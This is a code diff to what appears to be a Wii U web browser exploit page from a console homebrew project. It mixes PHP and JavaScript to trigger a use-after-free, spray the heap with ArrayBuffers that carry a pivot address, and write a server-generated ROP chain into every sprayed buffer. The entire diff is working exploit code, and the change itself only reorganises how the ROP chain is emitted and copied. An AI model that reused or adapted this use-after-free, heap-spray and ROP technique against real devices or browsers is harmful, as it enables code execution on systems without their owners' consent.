@@ -25,6 +25,7 @@ $wiiuhaxxcfg_payloadfilepath = "code550.bin"; // The actual payload that will be
 $wiiuhaxxcfg_loaderfilepath = "wiiuhaxx_common/wiiuhaxx_loader.bin";
 **/
 require_once("wiiuhaxx_common/wiiu_browserhax_common.php");
+generate_ropchain();
 ?>
 
 <!--
@@ -77,20 +78,11 @@ function UaF(a){
     dv.setUint32(0x0C, 0x00000000);         //m_failedLoadURL
     dv.setUint32(0x10, 0x00000000);         //m_hasPendingBeforeLoadEvent
     dv.setUint32(0x14, 0x00000000);         //padding
-    
-    //Rop helper
-    
-    var ropCurrentDv = null;
-    var ropCurrentOffset = 0;
+        
 
-    function ropchain_appendu8(val){
-        ropCurrentDv.setUint8(ropCurrentOffset, val);
-        ropCurrentOffset += 1;
-    }
-    
+    <?php echo "var realROPChain = [" .  hexentities($ROPCHAIN) . "]"; ?> // creates "var realROPChain = [...];"
 
-    //Spray large ArrayBuffer with pivotAdress
-    //Middle range 0x1B100000
+    //Spray large ArrayBuffer with pivotAdress   
     var ar = new Array(0x1800);
     for(var i=0; i<0x1800; i++){
         ar[i] = new DataView(new ArrayBuffer(_4K));
@@ -106,19 +98,12 @@ function UaF(a){
         ar[i].setUint32(0x208, pivotAdressAdress+0x300);
 
         //initialize this Rop Chain
-        ropCurrentDv = ar[i];
-        ropCurrentOffset = 0x304;
+        var ropCurrentOffset = 0x304;
         
-        var ropPrintStart = ropCurrentOffset;
-
-        //start of the Rop Chain
-        <?php
-            // This php function generates the ROP and places it into the global variable $ROPCHAIN
-            generate_ropchain();
-            echo $ROPCHAIN; // creates "var realROPChain = [...];" when "$ROPCHAIN_JS_VAR = 1;"
-        ?>
+        //start of the Rop Chain                
         realROPChain.forEach(function(element) {
-          ropchain_appendu8(element);
+            ar[i].setUint8(ropCurrentOffset, element);
+            ropCurrentOffset += 1;
         });
     }
 
